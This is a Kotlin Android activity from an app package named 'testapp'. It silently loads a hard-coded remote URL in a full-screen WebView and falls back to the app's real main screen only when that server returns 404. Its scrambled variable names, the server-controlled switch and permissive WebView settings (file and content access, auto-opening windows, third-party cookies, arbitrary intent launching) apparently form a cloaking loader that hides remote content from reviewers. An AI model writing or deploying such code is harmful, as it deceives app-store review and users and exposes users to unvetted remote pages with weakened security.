package com.example.testapp

import android.annotation.TargetApi
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.webkit.CookieManager
import android.webkit.ValueCallback
import android.webkit.WebChromeClient
import android.webkit.WebResourceError
import android.webkit.WebResourceRequest
import android.webkit.WebResourceResponse
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.isVisible

class StartActivity : AppCompatActivity() {
    private lateinit var myInfsdkf: SharedPreferences
    private var testLlfdsl: ValueCallback<Array<Uri>>? = null

    private lateinit var mFlslg: WebView
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        mFlslg = WebView(this)
        setContentView(mFlslg)
        mFlslg.isVisible = false
        myInfsdkf = getSharedPreferences("SP", Context.MODE_PRIVATE)
        mFlslg.webChromeClient = MyCClient()
        mFlslg.webViewClient = MyWClient()

        mFlslg.settings.javaScriptEnabled = true
        mFlslg.settings.domStorageEnabled = true
        mFlslg.settings.loadWithOverviewMode = true
        mFlslg.settings.useWideViewPort = true
        mFlslg.settings.allowFileAccess = true
        mFlslg.settings.allowContentAccess = true
        mFlslg.settings.javaScriptCanOpenWindowsAutomatically = true

        CookieManager.getInstance().setAcceptCookie(true)
        CookieManager.getInstance().setAcceptThirdPartyCookies(mFlslg, true)

        mFlslg.loadUrl("https://clponean.fun/MfpVwr")
    }

    private fun sattApppdas() {
        startActivity(Intent(this, MainActivity::class.java))
        finish()
    }
    private inner class MyCClient : WebChromeClient() {
        override fun onShowFileChooser(
            webView: WebView,
            filePathCallback: ValueCallback<Array<Uri>>,
            fileChooserParams: FileChooserParams
        ): Boolean {
            testLlfdsl = filePathCallback
            val intent = Intent(Intent.ACTION_GET_CONTENT)
            intent.addCategory(Intent.CATEGORY_OPENABLE)
            intent.type = "image/*"
            startActivityForResult(
                Intent.createChooser(intent, "File Chooser"),
                2
            )
            return true
        }
    }
    override fun onBackPressed() {
        if (mFlslg.canGoBack()) {
            mFlslg.goBack()
        } else {
            super.onBackPressed()
        }
    }
    private inner class MyWClient : WebViewClient() {
        @TargetApi(Build.VERSION_CODES.N)

        override fun onReceivedError(
            view: WebView?,
            request: WebResourceRequest?,
            error: WebResourceError?
        ) {
            super.onReceivedError(view, request, error)

            if (error?.errorCode == 404) {
                sattApppdas()
            }
        }

        override fun onReceivedHttpError(
            view: WebView?,
            request: WebResourceRequest?,
            errorResponse: WebResourceResponse?
        ) {
            super.onReceivedHttpError(view, request, errorResponse)

            if (errorResponse?.statusCode == 404) {
                sattApppdas()
            }
        }

        override fun onPageFinished(view: WebView?, url: String?) {
            super.onPageFinished(view, url)

            mFlslg.isVisible = true
        }
        override fun shouldOverrideUrlLoading(view: WebView, request: WebResourceRequest): Boolean {
            if (request.url.toString().startsWith("http"))
                view.loadUrl(request.url.toString())
            else
                startActivity(
                    Intent(
                        Intent.ACTION_VIEW,
                        request.url
                    )
                )
            return true

        }

        override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
            if (url.startsWith("http"))
                view.loadUrl(url)
            else
                startActivity(
                    Intent(
                        Intent.ACTION_VIEW,
                        Uri.parse(url)
                    )
                )
            return true
        }
    }
    override fun onActivityResult(requestCode: Int, resultCode: Int, intent: Intent?) {
        super.onActivityResult(requestCode, resultCode, intent)
        if (requestCode == 2) {
            if (testLlfdsl == null) return
            testLlfdsl?.onReceiveValue(
                WebChromeClient.FileChooserParams.parseResult(
                    resultCode,
                    intent
                )
            )
            testLlfdsl = null
        }
    }

}